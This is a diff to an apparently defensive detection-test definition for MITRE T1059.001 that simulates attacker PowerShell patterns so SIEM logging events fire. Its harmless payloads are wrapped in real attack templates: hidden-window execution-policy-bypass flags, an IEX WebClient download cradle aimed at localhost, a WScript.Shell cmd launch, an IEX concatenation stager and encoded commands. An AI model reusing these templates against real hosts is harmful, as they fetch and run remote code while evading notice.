@@ -1,30 +1,53 @@
 id: T1059.001
 name: PowerShell Execution
-description: Executes encoded PowerShell commands simulating attacker obfuscation. Generates critical ScriptBlock log events 4103/4104.
+description: Simulates the full range of attacker PowerShell invocation patterns — the canonical -NoP -NonI -W Hidden -Exec Bypass flag combination (tier-1 SIEM alert), download cradle pattern, COM object execution, IEX string concat, and reflective loading. EID 4104 ScriptBlock Logging records decoded content after deobfuscation — the most important PS detection event.
 tactic: execution
 technique_id: T1059.001
 platform: windows
 phase: attack
 elevation_required: false
 expected_events:
-  - "4104 (PowerShell ScriptBlock Logging)"
-  - "4103 (PowerShell Module Logging)"
-  - "4688 (powershell.exe process creation)"
+  - "4104 (PowerShell ScriptBlock — decoded script content logged post-deobfuscation)"
+  - "4103 (PowerShell Module Logging — IEX / Invoke-Expression calls)"
+  - "4688 / Sysmon 1 (powershell.exe with -NoP -NonI -W Hidden -Exec Bypass in CommandLine)"
+  - "Sysmon 3 (network connection from powershell.exe — download cradle attempt)"
 tags:
   - execution
   - no-prereqs
   - ueba-anomaly
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1059.001] PowerShell Execution - Simulating encoded command execution"
-    # Simulate encoded command (common attacker technique)
-    $command = "Write-Host 'LogNoJutsu: Simulated attacker payload executed via encoded command'; Get-Date; whoami"
-    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
-    Write-Host "Executing encoded command (simulated attacker behavior)..."
-    powershell.exe -NonInteractive -EncodedCommand $encoded
-    # Simulate download cradle pattern (no actual download)
-    Write-Host "Simulating IEX download cradle pattern..."
-    $simulatedPayload = { Get-Process | Select-Object -First 5 }
-    Invoke-Expression ($simulatedPayload.ToString())
+  command: |-
+    Write-Host "[T1059.001] PowerShell Execution — attacker invocation pattern simulation"
+
+    # Pattern 1: Full attacker flag set — triggers tier-1 SIEM rule
+    # -NoP -NonI -W Hidden -Exec Bypass combined = highest-signal PS CommandLine pattern
+    Write-Host "--- Pattern 1: Canonical attacker flags (-NoP -NonI -W Hidden -Exec Bypass) ---"
+    powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Write-Host 'LogNoJutsu T1059.001 attacker pattern'; Get-Date; hostname"
+
+    # Pattern 2: Download cradle (even to localhost — generates network connection event)
+    # IEX (New-Object Net.WebClient).DownloadString is in thousands of SIEM detection rules
+    Write-Host "--- Pattern 2: Download cradle pattern (Sysmon EID 3 network connection) ---"
+    powershell.exe -NoP -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:19999/lnj')" 2>&1 | Out-Null
+    Write-Host "Download cradle attempted (expected failure — Sysmon EID 3 still fires)"
+
+    # Pattern 3: COM WScript.Shell execution (parent-child chain: PS -> WScript.Shell -> cmd)
+    Write-Host "--- Pattern 3: COM WScript.Shell execution ---"
+    powershell.exe -NoP -Exec Bypass -Command {
+        $wsh = New-Object -ComObject WScript.Shell
+        $wsh.Run("cmd /c whoami", 0, $true) | Out-Null
+    }
+
+    # Pattern 4: IEX with string concatenation stager
+    Write-Host "--- Pattern 4: IEX concatenation stager (Cobalt Strike pattern) ---"
+    $a = 'Write'; $b = '-Host "LogNoJutsu'; $c = ' T1059 IEX stager"'
+    Invoke-Expression ($a + $b + $c)
+
+    # Pattern 5: Reflective .NET loading pattern (fileless execution simulation)
+    Write-Host "--- Pattern 5: Reflective assembly load pattern ---"
+    [System.Reflection.Assembly]::LoadWithPartialName("System.Core") | Out-Null
+    $code = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'LogNoJutsu T1059 reflective load'"))
+    powershell.exe -NoLogo -NonInteractive -EncodedCommand $code
+
+    Write-Host "[T1059.001] Complete. EID 4104 shows decoded payloads; Sysmon EID 1 shows attacker flags."
 cleanup: ""
